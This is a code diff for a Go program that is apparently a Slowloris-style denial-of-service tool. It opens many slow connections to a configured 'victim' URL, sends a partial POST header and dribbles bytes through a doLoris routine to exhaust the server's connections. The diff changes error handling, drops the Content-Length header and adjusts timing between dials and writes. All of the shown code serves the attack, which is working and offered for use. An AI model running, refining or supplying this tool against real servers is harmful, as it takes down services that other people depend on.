@@ -14,6 +14,7 @@ import (
 	"log"
 	"net"
 	"net/url"
+	"os"
 	"runtime"
 	"strings"
 	"time"
@@ -47,22 +48,26 @@ func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 	var err error
 	if err = LoadConfig(); err != nil {
-		log.Fatalf("Error loading configuration file:", err.Error())
+		fmt.Printf("Error loading configuration file:", err.Error())
+		os.Exit(1)
 	}
 	if SleepInterval, err = time.ParseDuration(Config.SleepInterval); err != nil {
-		log.Fatalf("Cannot parse sleep_interval=[%s]: [%s]\n", Config.SleepInterval, err)
+		fmt.Printf("Cannot parse sleep_interval=[%s]: [%s]\n", Config.SleepInterval, err)
+		os.Exit(1)
 	}
 	if TestDuration, err = time.ParseDuration(Config.TestDuration); err != nil {
-		log.Fatalf("Cannot parse test_duration=[%s]: [%s]\n", Config.TestDuration, err)
+		fmt.Printf("Cannot parse test_duration=[%s]: [%s]\n", Config.TestDuration, err)
+		os.Exit(1)
 	}
-	log.Printf("Starting...\n")
-	log.Printf("URL: %v\n", Config.URL)
-	log.Printf("Count workers: %v\n", Config.DialWorkersCount)
-	log.Printf("Sleep interval: %v\n", SleepInterval)
-	log.Printf("Test duration: %v\n", TestDuration)
+	fmt.Printf("Starting...\n")
+	fmt.Printf("URL: %v\n", Config.URL)
+	fmt.Printf("Count workers: %v\n", Config.DialWorkersCount)
+	fmt.Printf("Sleep interval: %v\n", SleepInterval)
+	fmt.Printf("Test duration: %v\n", TestDuration)
 	victimUri, err := url.Parse(Config.URL)
 	if err != nil {
-		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", time.Second, err)
+		fmt.Printf("Cannot parse victimUrl=[%s]: [%s]\n", time.Second, err)
+		os.Exit(1)
 	}
 	victimHostPort := victimUri.Host
 	if !strings.Contains(victimHostPort, ":") {
@@ -74,7 +79,7 @@ func main() {
 	}
 	hostname = victimUri.Host
 	host := victimUri.Host
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Length: 64000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
+	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
 		victimUri.RequestURI(), host))
 
 	activeConnectionsCh := make(chan int, Config.DialWorkersCount)
@@ -89,6 +94,7 @@ func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri
 	isTls := (victimUri.Scheme == "https")
 
 	for {
+		time.Sleep(SleepInterval)
 		conn := dialVictim(victimHostPort, isTls)
 		if conn != nil {
 			go doLoris(conn, activeConnectionsCh, requestHeader)
@@ -114,13 +120,13 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	}
 	tcpConn := conn.(*net.TCPConn)
 	if err = tcpConn.SetReadBuffer(128); err != nil {
-		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
+		log.Printf("Cannot shrink TCP read buffer: [%s]\n", err)
 	}
 	if err = tcpConn.SetWriteBuffer(128); err != nil {
-		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
+		log.Printf("Cannot shrink TCP write buffer: [%s]\n", err)
 	}
 	if err = tcpConn.SetLinger(0); err != nil {
-		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
+		log.Printf("Cannot disable TCP lingering: [%s]\n", err)
 	}
 	if !isTls {
 		return tcpConn
@@ -158,8 +164,7 @@ func doLoris(conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHea
 		select {
 		case <-readerStopCh:
 			return
-		default:
-			time.Sleep(SleepInterval)
+		case <-time.After(SleepInterval):
 		}
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, 4096, err)
